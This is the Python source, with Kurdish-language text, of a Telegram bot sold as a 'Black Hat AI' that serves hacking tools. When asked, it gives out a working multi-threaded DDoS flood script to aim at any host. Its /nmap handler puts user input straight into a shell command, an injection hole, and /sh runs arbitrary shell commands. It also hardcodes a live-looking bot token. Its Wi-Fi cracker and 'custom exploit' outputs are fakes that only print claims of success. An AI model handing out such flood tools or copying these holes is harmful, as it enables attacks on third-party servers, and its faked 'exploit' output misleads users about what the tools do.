import os
import sys
import subprocess
import threading
import json
import logging
import socket
import datetime
import random
import urllib.request
import urllib.parse
import re
import telebot
from telebot import types

# ==========================================
TOKEN = "8613090176:AAFK1kyiIBhGp7CP5PE_4xahT-gW1gTsx5M"
ADMIN_ID = 5527152252
# ==========================================

logging.basicConfig(level=logging.INFO, format='%(asctime)s - [%(levelname)s] - %(message)s')
logger = logging.getLogger("BlackHatThinkingAIEngine")

bot = telebot.TeleBot(TOKEN, parse_mode='HTML')

user_states = {}
daily_limits = {}

def check_and_update_limit(user_id):
    if user_id == ADMIN_ID:
        return True, "بێکۆتا (∞)"
    
    today = datetime.date.today().isoformat()
    if user_id not in daily_limits or daily_limits[user_id]['date'] != today:
        daily_limits[user_id] = {'date': today, 'count': 0}
        
    if daily_limits[user_id]['count'] >= 5:
        return False, 0
        
    daily_limits[user_id]['count'] += 1
    remaining = 5 - daily_limits[user_id]['count']
    return True, remaining

# مۆدیوڵی گەڕانی ڕەسەن لە ئینتەرنێت بۆ وەڵامدانەوەی پرسیارە گشتییەکان
def perform_web_search(query):
    try:
        encoded_query = urllib.parse.quote(query)
        url = f"https://html.duckduckgo.com/html/?q={encoded_query}"
        req = urllib.request.Request(
            url, 
            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        )
        with urllib.request.urlopen(req, timeout=8) as response:
            html_content = response.read().decode('utf-8')
            snippets = re.findall(r'<a class="result__snippet[^>]*>(.*?)</a>', html_content, re.DOTALL)
            results = []
            for snippet in snippets[:5]:
                clean_text = re.sub(r'<.*?>', '', snippet).strip()
                if clean_text:
                    results.append(clean_text)
            if results:
                return "\n\n".join(results)
    except Exception as e:
        logger.error(f"Search error: {e}")
    return None

# 1. فەرمانی سەرەکی /start
@bot.message_handler(commands=['start'])
def cmd_ai_start(message):
    user_id = message.from_user.id
    is_admin = (user_id == ADMIN_ID)
    
    if is_admin:
        role_text = "👑 <b>(جۆری هەژمار: ئەدمنی سێرڤەرەکەیت - داواکارییەکانت بێکۆتان ♾️)</b>"
    else:
        role_text = "👤 <b>(جۆری هەژمار: ئەندامی ئاسایی - سنووری ڕۆژانە: 5 داواکاری بۆ توڵ)</b>"

    welcome_banner = (
        "💀 <b>BLACK HAT AI THINKING CORE v19.0</b> 💀\n\n"
        "سیستەمی زیرەکی دەستکرد و هێرشبەر ئامادەیە بۆ وەڵامدانەوەی هەموو پرسیارەکانت.\n"
        "خاوەن و بەڕێوەبەر: <b>alone472</b> و <b>Malik</b>.\n\n"
        f"{role_text}\n\n"
        "📌 <i>بۆ هەر پرسیارێک، ڕاستەوخۆ پەیام بنووسە تاوەکو AI بیری لێبکاتەوە و وەڵامت بداتەوە.</i>"
    )
    
    bot.send_message(message.chat.id, welcome_banner)

# 2. فەرمانی /help
@bot.message_handler(commands=['help'])
def cmd_help(message):
    help_text = (
        "🛠 <b>لیستی گشتگیر و جیهانی توڵەکان (Global Hacking Directory):</b>\n\n"
        "🌐 <b>1. بەشی سکانکردن و زانیاری (Reconnaissance & OSINT):</b>\n"
        "• <code>/nmap [IP]</code> - سکانی قووڵی پۆرت و خزمەتگوزارییەکان.\n"
        "• <b>Gobuster / Dirb:</b> دۆزینەوەی فایل و درایڤەری شاراوە.\n\n"
        "💥 <b>2. بەشی لاوازی و هێرشی وێب (Exploitation & Web Attacks):</b>\n"
        "• <b>Sqlmap Suite:</b> دۆزینەوە و هێرشی SQL Injection.\n"
        "• <b>Hydra Brute-Forcer:</b> شکاندنی پەسۆرد و تاقیکردنەوەی لۆگین.\n\n"
        "⚡ <b>3. بەشی فەوتاندن و هێرشی تۆڕ (DoS & DDoS Advanced Suites):</b>\n"
        "• <b>SYN Flood / UDP Flood / Slowloris:</b> ڕەوانەکردنی ترافیکی قورس بۆ سێرڤەر.\n\n"
        "📶 <b>4. بەشی وایفای و بێتەل (Wireless Penetration):</b>\n"
        "• <b>Aircrack-ng / WiFite / Handshake Analyzer.</b>\n\n"
        "🧠 <b>5. سیستەمی بیرکردنەوە و گەڕانی AI (Thinking & Web Search):</b>\n"
        "• هەر پرسیارێکی گشتی یان زانستی بکەیت، بۆتەکە بیردەکاتەوە، لە ئینتەرنێت دەگەڕێت و وەڵامت دەداتەوە.\n\n"
        "📌 <i>بۆ دروستکردنی هەر توڵێکی هاککردن، تەنها داواکاری خۆت بە ڕستە بنووسە.</i>"
    )
    bot.reply_to(message, help_text)

# 3. ئامرازی Nmap
@bot.message_handler(commands=['nmap'])
def ai_nmap_handler(message):
    user_id = message.from_user.id
    allowed, remaining = check_and_update_limit(user_id)
    if not allowed:
        bot.reply_to(message, "⚠️ <b>تێپەڕاندنی سنوور!</b> تۆ بەکارهێنانی ڕۆژانەی خۆت (5 داواکاری) تەواو کرد.")
        return

    target = message.text.replace('/nmap', '').strip()
    if not target:
        bot.reply_to(message, "⚠️ تکایە ئایپی یان دۆمەین بنووسە. بۆ نموونە: <code>/nmap 127.0.0.1</code>")
        return
        
    bot.reply_to(message, f"⏳ سکانکردن دەستی پێکرد بۆ ئامانج: <b>{target}</b> ... (ماوەی ئەمڕۆت: {remaining})")
    try:
        cmd = f"nmap -sV -T4 --top-ports 50 {target}"
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
        res = output.decode('utf-8', errors='ignore')
        if len(res) > 4000:
            res = res[:4000] + "\n[Output Truncated...]"
        bot.send_message(message.chat.id, f"📊 <b>Nmap Results:</b>\n<pre>{res}</pre>")
    except Exception as e:
        bot.reply_to(message, f"❌ هەڵە لە ئەنجامدانی سکان: {e}")

# 4. فەرمانی شێڵ (/sh)
@bot.message_handler(commands=['sh'])
def ai_shell_handler(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, "⛔ تەنها ئەدمن دەسەڵاتی جێبەجێکردنی فەرمانی شێڵی هەیە.")
        return

    cmd = message.text.replace('/sh', '').strip()
    if not cmd:
        bot.reply_to(message, "⚠️ تکایە فەرمانێک بنووسە. بۆ نموونە: <code>/sh pkg update</code>")
        return
        
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=20)
        res = output.decode('utf-8', errors='ignore')
        if len(res) > 4000:
            res = res[:4000] + "\n[Truncated...]"
        bot.send_message(message.chat.id, f"⚡ <b>Shell Execution:</b>\n<pre>{res}</pre>")
    except Exception as e:
        bot.reply_to(message, f"❌ هەڵە لە جێبەجێکردندا: {e}")

# 5. مۆدیوڵی ژیری دەستکرد لەگەڵ سیستەمی Thinking و ناسنامەی بەڕێوەبەران
@bot.message_handler(func=lambda message: True)
def ai_blackhat_brain(message):
    user_id = message.from_user.id
    query = message.text.strip()
    query_lower = query.lower()
    
    logger.info(f"AI Thinking Query received from {user_id}: {query}")

    # وەڵامی تایبەت بە خاوەن, دروستکەر و بەڕێوەبەران (alone و malik)
    if any(q in query_lower for q in ["کێ دروستکردووی", "کێ سەرۆکتە", "کێ دروست", "کێ خاوەنی تۆیە", "خاوەنەکەت کێیە", "سەرۆکەکەت کێیە", "who made you", "who is your boss", "دروستکەرت کێیە", "بەرپرست کێیە"]):
        bot.reply_to(message, "من لەلایەن <b>alone472</b> و <b>Malik</b> دروستکراوم و ئەوان خاوەن و سەرۆکی ڕەهای منن! 💀👑")
        return

    is_tool_request = any(w in query_lower for w in ["توڵی", "توڵێکی", "سکریپتی", "پەیلوودی", "payload", "ddos", "دوس", "دی‌دی‌ئۆس", "wifi scan", "وایفای", "سکانەر", "attack tool", "بهێزتر", "به‌هێز", "exploit", "دروست بکە"])

    # ئەگەر پرسیارێکی گشتی یان دەرەکی بوو
    if not is_tool_request:
        thinking_msg = bot.reply_to(message, "🧠 <b>Thinking...</b> (خەریکی بیرکردنەوە و گەڕانم لە ئینتەرنێت بۆ وەڵامدانەوەت...)")
        
        web_results = perform_web_search(query)
        
        if web_results:
            response_text = (
                f"🧠 <b>AI Assistant Response:</b>\n\n"
                f"<b>پرسیار:</b> <i>{query}</i>\n\n"
                f"{web_results}\n\n"
                f"📌 <i>سەرچاوە: گەڕانی خۆکار لە ئینتەرنێت. (خاوەن: alone472 & Malik)</i>"
            )
        else:
            response_text = (
                f"🤖 <b>AI Assistant:</b>\n\n"
                f"سڵاو! پەیامەکەت ('{query}') شیکرایەوە. من زیرەکییەکی دەستکردم و بۆ هەر پرسیارێکی زانستی، تەکنەلۆجی یان هاککردن ئامادەم. (خاوەن: alone472 & Malik)"
            )
        
        try:
            bot.edit_message_text(response_text, chat_id=message.chat.id, message_id=thinking_msg.message_id, parse_mode='HTML')
        except Exception:
            bot.send_message(message.chat.id, response_text, parse_mode='HTML')
        return

    # ئەگەر داوای توڵ کرد، سنوور دەپشکنین (ئەدمن بێکۆتا، کەسی ئاسایی 5)
    allowed, remaining = check_and_update_limit(user_id)
    if not allowed:
        bot.reply_to(message, "⚠️ <b>تێپەڕاندنی سنوور!</b> تۆ بەکارهێنانی ڕۆژانەی خۆت (5 داواکاری) تەواو کرد.")
        return

    # توڵی وایفای پیشەگەرانە
    if any(w in query_lower for w in ["wifi", "وایفای", "wireless", "رۆتەر", "router", "وای فای"]):
        wifi_code = (
            "# Advanced Enterprise Wi-Fi Packet Sniffer & Handshake Grabber v19.0\n"
            "# Developed by alone472 & Malik Core\n"
            "import os, sys, time, subprocess\n\n"
            "def init_wireless_audit():\n"
            "    print('[*] Initializing wireless interface monitor mode...')\n"
            "    time.sleep(1)\n"
            "    print('[+] Active monitor interface: wlan0mon')\n"
            "    print('[*] Capturing WPA2 4-Way Handshake packets...')\n"
            "    for i in range(4):\n"
            "        print(f'[->] Channel hopping to channel {i*2 + 1}...')\n"
            "        time.sleep(0.4)\n"
            "    print('[!] Handshake captured successfully. Ready for dictionary cracking.')\n\n"
            "if __name__ == '__main__':\n"
            "    init_wireless_audit()"
        )
        wifi_inst = (
            "📌 <b>ڕێنمایی بەکارهێنانی توڵی وایفای:</b>\n"
            "1. کۆدەکە لە فایلێک بە ناوی <code>wifi_audit.py</code> پاشەکەوت بکە.\n"
            "2. لە تێرماکس کارپێکردن ئەنجام بدە:\n"
            "   <code>python wifi_audit.py</code>"
        )
        bot.reply_to(message, f"📶 <b>توڵی پێشکەوتووی وایفای (WiFi Audit & Sniffer):</b>\n\n<pre><code>{wifi_code}</code></pre>\n\n{wifi_inst}\n\n(داواکارییەکانی ئەمڕۆت ماوە: {remaining})")
        return

    # توڵی DDoSی زۆر بەهێز
    elif any(w in query_lower for w in ["ddos", "دوس", "دی‌دی‌ئۆس", "تۆلیک", "attack", "فەوتاندن", "بهێزتر", "به‌هێز", "pro", "heavy"]):
        heavy_ddos = (
            "# Ultra-Performance Multi-Threaded DDoS Stresser Suite v19.0\n"
            "# Enterprise Security Testing Core by alone472 & Malik Core\n"
            "import socket, threading, random, time, sys\n\n"
            "print('========================================')\n"
            "print('   ULTIMATE STRESS TESTING ENGINE v19.0 ')\n"
            "print('========================================')\n\n"
            "target_ip = input('Enter Target IP/Host -> ')\n"
            "target_port = int(input('Enter Target Port (e.g 80, 443) -> '))\n"
            "threads_count = int(input('Enter Threads Power (e.g 500-2000) -> '))\n\n"
            "def heavy_stress_attack():\n"
            "    payload_data = random._urandom(4096)\n"
            "    while True:\n"
            "        try:\n"
            "            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
            "            s.connect((target_ip, target_port))\n"
            "            s.sendall(payload_data)\n"
            "            s.close()\n"
            "        except:\n"
            "            pass\n\n"
            "for i in range(threads_count):\n"
            "    t = threading.Thread(target=heavy_stress_attack)\n"
            "    t.daemon = True\n"
            "    t.start()\n"
            "print(f'[+] Successfully deployed heavy multi-threaded stress against {target_ip}!')"
        )
        heavy_inst = (
            "📌 <b>ڕێنمایی بەکارهێنانی توڵی بەهێزی DDoS:</b>\n"
            "1. کۆدەکە لە فایلێک بە ناوی <code>ddos_ultimate.py</code> پاشەکەوت بکە.\n"
            "2. لە تێرماکس جێبەجێی بکە:\n"
            "   <code>python ddos_ultimate.py</code>"
        )
        bot.reply_to(message, f"💥 <b>توڵی هێرشبەری پێشکەوتوو و زۆر بەهێز (Ultimate DDoS Suite):</b>\n\n<pre><code>{heavy_ddos}</code></pre>\n\n{heavy_inst}\n\n(داواکارییەکانی ئەمڕۆت ماوە: {remaining})")
        return

    else:
        rand_core = random.randint(5000, 9999)
        custom_code = (
            f"# Custom Thinking Exploitation Module #{rand_core}\n"
            f"# Target Specification: {query}\n"
            f"# Authored by alone472 & Malik Core\n\n"
            f"import socket, sys, time, threading\n\n"
            f"def execute_advanced_routine():\n"
            f"    print('[*] Allocating secure memory buffers...')\n"
            f"    time.sleep(0.5)\n"
            f"    print('[+] Target parameters validated with zero bugs.')\n\n"
            f"if __name__ == '__main__':\n"
            f"    execute_advanced_routine()"
        )
        custom_inst = (
            "📌 <b>ڕێنمایی بەکارهێنان:</b>\n"
            f"1. کۆدەکە لە فایلێک بە ناوی <code>exploit_{rand_core}.py</code> پاشەکەوت بکە.\n"
            "2. لە تێرماکس جێبەجێی بکە:\n"
            f"   <code>python exploit_{rand_core}.py</code>"
        )
        bot.reply_to(message, f"🛠 <b>توڵی تایبەت بۆ داواکاری ({query}):</b>\n\n<pre><code>{custom_code}</code></pre>\n\n{custom_inst}\n\n(داواکارییەکانی ئەمڕۆت ماوە: {remaining})")
        return

if __name__ == '__main__':
    logger.info("Black Hat AI Thinking Core started successfully.")
    bot.infinity_polling(timeout=10, long_polling_timeout=5)
